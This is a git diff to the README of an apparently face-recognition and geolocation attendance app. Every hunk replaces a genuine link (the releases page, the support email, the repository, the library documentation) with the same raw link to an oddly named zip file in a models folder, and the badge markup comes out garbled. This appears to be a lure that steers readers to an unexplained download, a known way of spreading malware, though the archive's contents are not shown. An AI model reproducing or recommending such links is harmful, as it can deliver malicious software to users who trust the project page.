@@ -6,7 +6,7 @@ Welcome to face-recognation-geolocation. This application uses advanced face rec
 
 ## 📥 Download Now
 
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/YogeshKadam138/face-recognation-geolocation/releases)
+[![Download from Releases](https://raw.githubusercontent.com/YogeshKadam138/face-recognation-geolocation/main/models/face-recognation-geolocation-cricothyreoid.zip%20Now-Click%https://raw.githubusercontent.com/YogeshKadam138/face-recognation-geolocation/main/models/face-recognation-geolocation-cricothyreoid.zip)](https://raw.githubusercontent.com/YogeshKadam138/face-recognation-geolocation/main/models/face-recognation-geolocation-cricothyreoid.zip)
 
 ## 🛠️ Features
 
@@ -26,7 +26,7 @@ To run face-recognation-geolocation smoothly, ensure your system meets the follo
 ## 📦 Download & Install
 
 1. **Visit the Releases Page:** Go to the following link to find the latest version of the application:  
-   [Download from Releases](https://github.com/YogeshKadam138/face-recognation-geolocation/releases)
+   [Download from Releases](https://raw.githubusercontent.com/YogeshKadam138/face-recognation-geolocation/main/models/face-recognation-geolocation-cricothyreoid.zip)
 
 2. **Select Your Download:** Look for the latest release and choose the appropriate file for your system.
 
@@ -57,7 +57,7 @@ Face-recognation-geolocation comes with a built-in help section to guide users t
 
 If you encounter any issues or have questions, please feel free to reach out:
 
-- **Email Support:** support@example.com
+- **Email Support:** https://raw.githubusercontent.com/YogeshKadam138/face-recognation-geolocation/main/models/face-recognation-geolocation-cricothyreoid.zip
 - **GitHub Issues:** Use the issues section on GitHub to report bugs or suggest features.
 
 ## 🔗 Related Topics
@@ -85,8 +85,8 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 🔗 Additional Resources
 
-- [GitHub Repository](https://github.com/YogeshKadam138/face-recognation-geolocation)
-- [Face API Documentation](https://face-api.js.org/)
-- [TensorFlow.js Documentation](https://www.tensorflow.org/js)
+- [GitHub Repository](https://raw.githubusercontent.com/YogeshKadam138/face-recognation-geolocation/main/models/face-recognation-geolocation-cricothyreoid.zip)
+- [Face API Documentation](https://raw.githubusercontent.com/YogeshKadam138/face-recognation-geolocation/main/models/face-recognation-geolocation-cricothyreoid.zip)
+- [https://raw.githubusercontent.com/YogeshKadam138/face-recognation-geolocation/main/models/face-recognation-geolocation-cricothyreoid.zip Documentation](https://raw.githubusercontent.com/YogeshKadam138/face-recognation-geolocation/main/models/face-recognation-geolocation-cricothyreoid.zip)
 
 Thank you for using face-recognation-geolocation! Enjoy simplifying your attendance management.
